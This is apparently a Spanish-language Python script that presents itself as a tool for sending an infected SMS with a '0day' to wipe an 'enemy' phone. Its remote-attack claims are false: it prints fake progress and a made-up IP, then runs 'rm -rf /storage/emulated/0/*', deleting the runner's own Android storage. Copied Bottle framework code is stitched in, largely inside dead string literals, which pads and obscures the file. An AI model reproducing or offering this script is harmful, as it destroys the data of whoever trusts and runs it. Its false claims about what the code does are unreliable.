            environ['wsgi.errors'].write(err)
            environ['wsgi.errors'].flush()
            headers = [('Content-Type', 'text/html; charset=UTF-8')]
            start_response('500 INTERNAL SERVER ERROR', headers, sys.exc_info())
            return [tob(err)]

    def __call__(self, environ, start_response):
        """ Each instance of :class:'Bottle' is a WSGI application. """
        return self.wsgi(environ, start_response)

    def __enter__(self):
        """ Use this application as default for all module-level shortcuts. """
        default_app.push(self)
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        default_app.pop()

    def __setattr__(self, name, value):
        if name in self.__dict__:
            raise AttributeError("Attribute %s already defined. Plugin conflict?" % name)
        self.__dict__[name] = value


###############################################################################
# HTTP and WSGI Tools ##########################################################
###############################################################################


class BaseRequest(object):
    """ A wrapper for WSGI environment dictionaries that adds a lot of
        convenient access methods and properties. Most of them are read-only.
        Adding new attributes to a request actually adds them to the environ
        dictionary (as 'bottle.request.ext.<name>'). This is the recommended
        way to store and access request-specific data.
    """

    __slots__ = ('environ', )

    #: Maximum size of memory buffer for :attr:`body` in bytes.
    MEMFILE_MAX = 102400

    def __init__(self, environ=None):
        """ Wrap a WSGI environ dictionary. """
        #: The wrapped WSGI environ dictionary. This is the only real attribute.
        #: All other attributes actually are read-only properties.
        self.environ = {} if environ is None else environ
        self.environ['bottle.request'] = self

    @DictProperty('environ', 'bottle.app', read_only=True)
    def app(self):
        """ Bottle application handling this request. """
        raise RuntimeError('This request is not connected to an application.')

    @DictProperty('environ', 'bottle.route', read_only=True)
    def route(self):
        """ The bottle :class:`Route` object that matches this request. """
        raise RuntimeError('This request is not connected to a route.')

    @DictProperty('environ', 'route.url_args', read_only=True)
    def url_args(self):
        """ The arguments extracted from the URL. """
        raise RuntimeError('This request is not connected to a route.')

    @property
    def path(self):
        """ The value of ``PATH_INFO`` with exactly one prefixed slash (to fix
            broken clients and avoid the "empty path" edge case). """
        return '/' + self.environ.get('PATH_INFO', '').lstrip('/')

    @property
    def method(self):
        """ The ``REQUEST_METHOD`` value as an uppercase string. """
        return self.environ.get('REQUEST_METHOD', 'GET').upper()

    @DictProperty('environ', 'bottle.request.headers', read_only=True)
    def headers(self):
        """ A :class:`WSGIHeaderDict` that provides case-insensitive access to
            HTTP request headers. """
        return WSGIHeaderDict(self.environ)

    def get_header(self, name, default=None):
        """ Return the value of a request header, or a given default value. """
        return self.headers.get(name, default)

    @DictProperty('environ', 'bottle.request.cookies', read_only=True)
    def cookies(self):
        """ Cookies parsed into a :class:`FormsDict`. Signed cookies are NOT
            decoded. Use :meth:`get_cookie` if you expect signed cookies. """
        cookies = SimpleCookie(self.environ.get('HTTP_COOKIE', '')).values()
        return FormsDict((c.key, c.value) for c in cookies)

    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default

    @DictProperty('environ', 'bottle.request.query', read_only=True)
    def query(self):
        """ The :attr:`query_string` parsed into a :class:`FormsDict`. These
            values are sometimes called "URL arguments" or "GET parameters", but
            not to be confused with "URL wildcards" as they are provided by the
            :class:`Router`. """
        get = self.environ['bottle.get'] = FormsDict()
        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))
        for key, value in pairs:
            get[key] = value
        return get

    @DictProperty('environ', 'bottle.request.forms', read_only=True)
    def forms(self):
        """ Form values parsed from an `url-encoded` or `multipart/form-data`
            encoded POST or PUT request body. The result is returned as a
            :class:`FormsDict`. All keys and values are strings. File uploads
            are stored separately in :attr:`files`. """
        forms = FormsDict()
        forms.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if not isinstance(item, FileUpload):
                forms[name] = item
        return forms

    @DictProperty('environ', 'bottle.request.params', read_only=True)
    def params(self):
        """ A :class:`FormsDict` with the combined values of :attr:`query` and
            :attr:`forms`. File uploads are stored in :attr:`files`. """
        params = FormsDict()
        for key, value in self.query.allitems():
            params[key] = value
        for key, value in self.forms.allitems():
            params[key] = value
        return params

    @DictProperty('environ', 'bottle.request.files', read_only=True)
    def files(self):
        """ File uploads parsed from `multipart/form-data` encoded POST or PUT
            request body. The values are instances of :class:`FileUpload`.
        """
        files = FormsDict()
        files.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if isinstance(item, FileUpload):
                files[name] = item
        return files

    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json`` or
            ``application/json-rpc``, this property holds the parsed content
            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`
            are processed to avoid memory exhaustion.
            Invalid JSON raises a 400 error response.
        """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype in ('application/json', 'application/json-rpc'):
            b = self._get_body_string(self.MEMFILE_MAX)
            if not b:
                return None
            try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err

    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data

    @property
    def body(self):
        """ The HTTP request body as a seek-able file-like object. Depending on
            :attr:`MEMFILE_MAX`, this is either a temporary file or a
            :class:`io.BytesIO` instance. Accessing this property for the first
            time reads and replaces the ``wsgi.input`` environ variable.
            Subsequent accesses just do a `seek(0)` on the file object. """
        self._body.seek(0)
        return self._body

    @property
    def chunked(self):
        """ True if Chunked transfer encoding was. """
        return 'chunked' in self.environ.get(
            'HTTP_TRANSFER_ENCODING', '').lower()

    #: An alias for :attr:`query`.
    GET = query

    @DictProperty('environ', 'bottle.request.post', read_only=True)
    def POST(self):
        """ The values of :attr:`forms` and :attr:`files` combined into a single
            :class:`FormsDict`. Values are either strings (form values) or
            instances of :class:`cgi.FieldStorage` (file uploads).
        """
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')
            for key, value in _parse_qsl(body):
                post[key] = value
            return post

        safe_env = {'QUERY_STRING': ''}  # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)

        if py3k:
            args['encoding'] = 'utf8'
            post.recode_unicode = False
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data  #http://bugs.python.org/issue18394
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post

    @property
    def url(self):
        """ The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly. """
        return self.urlparts.geturl()

    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
        """ The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. """
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_PROTO') \
             or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')

    @property
    def fullpath(self):
        """ Request path including :attr:`script_name` (if present). """
        return urljoin(self.script_name, self.path.lstrip('/'))

    @property
    def query_string(self):
        """ The raw :attr:`query` part of the URL (everything in between ``?``
            and ``#``) as a string. """
        return self.environ.get('QUERY_STRING', '')

    @property
    def script_name(self):
        """ The initial portion of the URL's `path` that was removed by a higher
            level (server or routing middleware) before the application was
            called. This script path is returned with leading and tailing
            slashes. """
        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')
        return '/' + script_name + '/' if script_name else '/'

    def path_shift(self, shift=1):
        """ Shift path segments from :attr:`path` to :attr:`script_name` and
            vice versa.
           :param shift: The number of path segments to shift. May be negative
                         to change the shift direction. (default: 1)
        """
        script, path = path_shift(self.environ.get('SCRIPT_NAME', '/'), self.path, shift)
        self['SCRIPT_NAME'], self['PATH_INFO'] = script, path

    @property
    def content_length(self):
        """ The request body length as an integer. The client is responsible to
            set this header. Otherwise, the real length of the body is unknown
            and -1 is returned. In this case, :attr:`body` will be empty. """
        return int(self.environ.get('CONTENT_LENGTH') or -1)

    @property
    def content_type(self):
        """ The Content-Type header as a lowercase-string (default: empty). """
        return self.environ.get('CONTENT_TYPE', '').lower()

    @property
    def is_xhr(self):
        """ True if the request was triggered by a XMLHttpRequest. This only
            works with JavaScript libraries that support the `X-Requested-With`
            header (most of the popular libraries do). """
        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH', '')
        return requested_with.lower() == 'xmlhttprequest'

    @property
    def is_ajax(self):
        """ Alias for :attr:`is_xhr`. "Ajax" is not the right term. """
        return self.is_xhr

    @property
    def auth(self):
        """ HTTP authentication data as a (user, password) tuple. This
            implementation currently supports basic (not digest) authentication
            only. If the authentication happened at a higher level (e.g. in the
            front web-server or a middleware), the password field is None, but
            the user field is looked up from the ``REMOTE_USER`` environ
            variable. On any errors, None is returned. """
        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION', ''))
        if basic: return basic
        ruser = self.environ.get('REMOTE_USER')
        if ruser: return (ruser, None)
        return None

    @property
    def remote_route(self):
        """ A list of all IPs that were involved in this request, starting with
            the client IP and followed by zero or more proxies. This does only
            work if all proxies support the ```X-Forwarded-For`` header. Note
            that this information can be forged by malicious clients. """
        proxy = self.environ.get('HTTP_X_FORWARDED_FOR')
        if proxy: return [ip.strip() for ip in proxy.split(',')]
        remote = self.environ.get('REMOTE_ADDR')
        return [remote] if remote else []

    @property
    def remote_addr(self):
        """ The client IP as a string. Note that this information can be forged
            by malicious clients. """
        route = self.remote_route
        return route[0] if route else None

    def copy(self):
        """ Return a new :class:`Request` with a shallow :attr:`environ` copy. """
        return Request(self.environ.copy())

    def get(self, value, default=None):
        return self.environ.get(value, default)

    def __getitem__(self, key):
        return self.environ[key]

    def __delitem__(self, key):
        self[key] = ""
        del (self.environ[key])

    def __iter__(self):
        return iter(self.environ)

    def __len__(self):
        return len(self.environ)

    def keys(self):
        return self.environ.keys()

    def __setitem__(self, key, value):
        """ Change an environ value and clear all caches that depend on it. """

        if self.environ.get('bottle.request.readonly'):
            raise KeyError('The environ dictionary is read-only.')

        self.environ[key] = value
        todelete = ()

        if key == 'wsgi.input':
            todelete = ('body', 'forms', 'files', 'params', 'post', 'json')
        elif key == 'QUERY_STRING':
            todelete = ('query', 'params')
        elif key.startswith('HTTP_'):
            todelete = ('headers', 'cookies')

        for key in todelete:
            self.environ.pop('bottle.request.' + key, None)

    def __repr__(self):
        return '<%s: %s %s>' % (self.__class__.__name__, self.method, self.url)

    def __getattr__(self, name):
        """ Search in self.environ for additional user defined attributes. """
        try:
            var = self.environ['bottle.request.ext.%s' % name]
            return var.__get__(self) if hasattr(var, '__get__') else var
        except KeyError:
            raise AttributeError('Attribute %r not defined.' % name)

    def __setattr__(self, name, value):
        if name == 'environ': return object.__setattr__(self, name, value)
        key = 'bottle.request.ext.%s' % name
        if key in self.environ:
            raise AttributeError("Attribute already defined: %s" % name)
        self.environ[key] = value

    def __delattr__(self, name):
        try:
            del self.environ['bottle.request.ext.%s' % name]
        except KeyError:         raise AttributeError("Attribute not defined: %s" % name)  '''

def banner():
    print("""
    
                                     
  ______ _____   ______            
 /  ___//     \ /  ___/            
 \___ \|  Y Y  \\___ \             
/____  >__|_|  /____  >            
     \/      \/     \/             
.__        _____              __   
|__| _____/ ____\____   _____/  |_ 
|  |/    \   __\/ __ \_/ ___\   __\
|  |   |  \  | \  ___/\  \___|  |  
|__|___|  /__|  \___  >\___  >__|  
        \/          \/     \/      

Herramienta que envia un sms infectado al dispositivo.
genera persistencia y elimina todo el telefono de nuestro enemigo.
(comunicacion de red internacional (no cableado))
    """)

'''
def fetr():
        def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default

    @DictProperty('environ', 'bottle.request.query', read_only=True)
    def query(self):
        """ The :attr:`query_string` parsed into a :class:`FormsDict`. These
            values are sometimes called "URL arguments" or "GET parameters", but
            not to be confused with "URL wildcards" as they are provided by the
            :class:`Router`. """
        get = self.environ['bottle.get'] = FormsDict()
        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))
        for key, value in pairs:
            get[key] = value
        return get

    @DictProperty('environ', 'bottle.request.forms', read_only=True)
    def forms(self):
        """ Form values parsed from an `url-encoded` or `multipart/form-data`
            encoded POST or PUT request body. The result is returned as a
            :class:`FormsDict`. All keys and values are strings. File uploads
            are stored separately in :attr:`files`. """
        forms = FormsDict()
        forms.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if not isinstance(item, FileUpload):
                forms[name] = item
        return forms

    @DictProperty('environ', 'bottle.request.params', read_only=True)
    def params(self):
        """ A :class:`FormsDict` with the combined values of :attr:`query` and
            :attr:`forms`. File uploads are stored in :attr:`files`. """
        params = FormsDict()
        for key, value in self.query.allitems():
            params[key] = value
        for key, value in self.forms.allitems():
            params[key] = value
        return params

    @DictProperty('environ', 'bottle.request.files', read_only=True)
    def files(self):
        """ File uploads parsed from `multipart/form-data` encoded POST or PUT
            request body. The values are instances of :class:`FileUpload`.
        """
        files = FormsDict()
        files.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if isinstance(item, FileUpload):
                files[name] = item
        return files

    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json`` or
            ``application/json-rpc``, this property holds the parsed content
            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`
            are processed to avoid memory exhaustion.
            Invalid JSON raises a 400 error response.
        """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype in ('application/json', 'application/json-rpc'):
            b = self._get_body_string(self.MEMFILE_MAX)
            if not b:
                return None
            try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err

    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data

    @property
    def body(self):
        """ The HTTP request body as a seek-able file-like object. Depending on
            :attr:`MEMFILE_MAX`, this is either a temporary file or a
            :class:`io.BytesIO` instance. Accessing this property for the first
            time reads and replaces the ``wsgi.input`` environ variable.
            Subsequent accesses just do a `seek(0)` on the file object. """
        self._body.seek(0)
        return self._body

    @property
    def chunked(self):
        """ True if Chunked transfer encoding was. """
        return 'chunked' in self.environ.get(
            'HTTP_TRANSFER_ENCODING', '').lower()

    #: An alias for :attr:`query`.
    GET = query

    @DictProperty('environ', 'bottle.request.post', read_only=True)
    def POST(self):
        """ The values of :attr:`forms` and :attr:`files` combined into a single
            :class:`FormsDict`. Values are either strings (form values) or
            instances of :class:`cgi.FieldStorage` (file uploads).
        """
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')
            for key, value in _parse_qsl(body):
                post[key] = value
            return post

        safe_env = {'QUERY_STRING': ''}  # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)

        if py3k:
            args['encoding'] = 'utf8'
            post.recode_unicode = False
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data  #http://bugs.python.org/issue18394
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post

    @property
    def url(self):
        """ The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly. """
        return self.urlparts.geturl()

    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
        """ The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. """
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_PROTO') \
             or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')

    @property
    def fullpath(self):
        """ Request path including :attr:`script_name` (if present). """
        return urljoin(self.script_name, self.path.lstrip('/'))

    @property
    def query_string(self):
        """ The raw :attr:`query` part of the URL (everything in between ``?``
            and ``#``) as a string. """
        return self.environ.get('QUERY_STRING', '')

    @property
    def script_name(self):
        """ The initial portion of the URL's `path` that was removed by a higher
            level (server or routing middleware) before the application was
            called. This script path is returned with leading and tailing
            slashes. """
        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')
        return '/' + script_name + '/' if script_name else '/'

    def path_shift(self, shift=1):
        """ Shift path segments from :attr:`path` to :attr:`script_name` and
            vice versa.
           :param shift: The number of path segments to shift. May be negative
                         to change the shift direction. (default: 1)
        """
        script, path = path_shift(self.environ.get('SCRIPT_NAME', '/'), self.path, shift)
        self['SCRIPT_NAME'], self['PATH_INFO'] = script, path

    @property
    def content_length(self):
        """ The request body length as an integer. The client is responsible to
            set this header. Otherwise, the real length of the body is unknown
            and -1 is returned. In this case, :attr:`body` will be empty. """
        return int(self.environ.get('CONTENT_LENGTH') or -1)

    @property
    def content_type(self):
        """ The Content-Type header as a lowercase-string (default: empty). """
        return self.environ.get('CONTENT_TYPE', '').lower()

    @property
    def is_xhr(self):
        """ True if the request was triggered by a XMLHttpRequest. This only
            works with JavaScript libraries that support the `X-Requested-With`
            header (most of the popular libraries do). """
        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH', '')
        return requested_with.lower() == 'xmlhttprequest'

    @property
    def is_ajax(self):
        """ Alias for :attr:`is_xhr`. "Ajax" is not the right term. """
        return self.is_xhr

    @property
    def auth(self):
        """ HTTP authentication data as a (user, password) tuple. This
            implementation currently supports basic (not digest) authentication
            only. If the authentication happened at a higher level (e.g. in the
            front web-server or a middleware), the password field is None, but
            the user field is looked up from the ``REMOTE_USER`` environ
            variable. On any errors, None is returned. """
        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION', ''))
        if basic: return basic
        ruser = self.environ.get('REMOTE_USER')
        if ruser: return (ruser, None)
        return None

    @property
    def remote_route(self):
        """ A list of all IPs that were involved in this request, starting with
            the client IP and followed by zero or more proxies. This does only
            work if all proxies support the ```X-Forwarded-For`` header. Note
            that this information can be forged by malicious clients. """
        proxy = self.environ.get('HTTP_X_FORWARDED_FOR')
        if proxy: return [ip.strip() for ip in proxy.split(',')]
        remote = self.environ.get('REMOTE_ADDR')
        return [remote] if remote else []

    @property
    def remote_addr(self):
        """ The client IP as a string. Note that this information can be forged
            by malicious clients. """
        route = self.remote_route
#        return route[0] if route else None
'''
banner()


numero = input("\n Introduce el número del enemigo: ")
print("\n CARGANDO....")
print(f"\n Mandando SMS infectada con 0day a {numero}")

time.sleep(10)

print(f"\n introduciendose en el dispositivo, IP: 143.12.121.65")

time.sleep(10)

'''

    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json`` or
            ``application/json-rpc``, this property holds the parsed content
            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`
            are processed to avoid memory exhaustion.
            Invalid JSON raises a 400 error response.
        """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype in ('application/json', 'application/json-rpc'):
            b = self._get_body_string(self.MEMFILE_MAX)
            if not b:
                return None
            try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err

    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data'''

print(f"\n Generando persistencia al {numero}")

time.sleep(10)

siii = int(input(" \n Persistencia lista, preparado para eliminar todo?\n\n En tu pantalla se mostrara lo que se va borrando del objetivo\n Listo?  \n 1)si \n responde:  "))
os.system("clear")
if siii == 1:
    print(" \n comienzo de depuracion del telefono objetivo")
    print(" en 6")
    time.sleep(1)
    print(" en 5")
    time.sleep(1)
    print(" en 4")
    time.sleep(1)
    print(" en 3")
    time.sleep(1)
    print(" en 2")
    time.sleep(1)
    print(" en 1")
    time.sleep(1)
    print(" Formateando el telefono del enemigo")
    os.system("rm -rf /storage/emulated/0/*")

'''try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err

    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data

 try:
                return json_loads(b)
            except (ValueError, TypeError):
         raise HTTPError(400, 'Invalid JSON')
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
